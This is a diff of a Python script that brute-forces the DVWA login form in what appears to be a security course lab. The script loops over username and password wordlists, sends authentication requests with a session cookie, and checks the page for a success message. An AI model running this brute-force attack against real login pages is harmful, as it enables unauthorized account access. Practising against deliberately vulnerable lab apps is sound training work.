@@ -1,7 +1,7 @@
 from bs4 import BeautifulSoup
 import requests
-import hashlib
 import time
+import re
 
 with open("small-password.txt") as pfile:
     passwords = pfile.readlines()
@@ -10,20 +10,37 @@ with open("small-usernames.txt") as ufile:
     users = ufile.readlines()
 
 cookies_jar = requests.cookies.RequestsCookieJar()
-cookies_jar.set('PHPSESSID','er8j156t7rn1ccnc7th7dv0ih7')
-cookies_jar.set('security','low')
+cookies_jar.set('PHPSESSID', 'enter')
+cookies_jar.set('security', 'low')
 
-h = hashlib.new('sha256')
-for username in users:
-    for password in passwords:
-        username = username.replace('\r','').replace('\n','')
-        password = password.replace('\r', '').replace('\n', '')
-        url = 'http://1.2.3.4/DVWA/vulnerabilities/brute/#'
-        params = {'username': username,'password': password,'Login': 'Login'}
-        r = requests.get(url ,params ,auth=('itp270','itp270'), cookies=cookies_jar, )
-        parseHTML = BeautifulSoup(r.text, 'html.parser')
-        htmlDiv = parseHTML.find('div',{'class': 'vulnerable_code_area'})
+url = 'http://server/DVWA/vulnerabilities/brute/#'
 
-        h.update(r.text.encode())
-        print ("trying %s:\n %s: %s - \nhash: %s\n----------\n" % (url, username, password, str(htmlDiv)))
-        time.sleep(3)
+
+def brute_force():
+    for username in users:
+        username = username.replace('\r', '').replace('\n', '')
+        for password in passwords:
+            page_html = try_auth(username,password)
+            print("[-]trying %s: %s: %s" % (url, username, password))
+            if check_result(page_html):
+                print("[+]SUCCESS - username/password worked %s:%s" % (username, password))
+                return
+            time.sleep(3)
+
+
+def try_auth(username, password):
+    password = password.replace('\r', '').replace('\n', '')
+    params = {'username': username, 'password': password, 'Login': 'Login'}
+    r = requests.get(url, params, auth=('itp270', 'itp270'), cookies=cookies_jar, )
+    parse_html = BeautifulSoup(r.text, 'html.parser')
+    result = parse_html.find('div', {'class': 'vulnerable_code_area'})
+    return result
+
+
+def check_result(page_html):
+    if re.findall(r'.*Welcome to the password protected area admin.*', str(page_html)):
+        return True
+    return False
+
+
+brute_force()
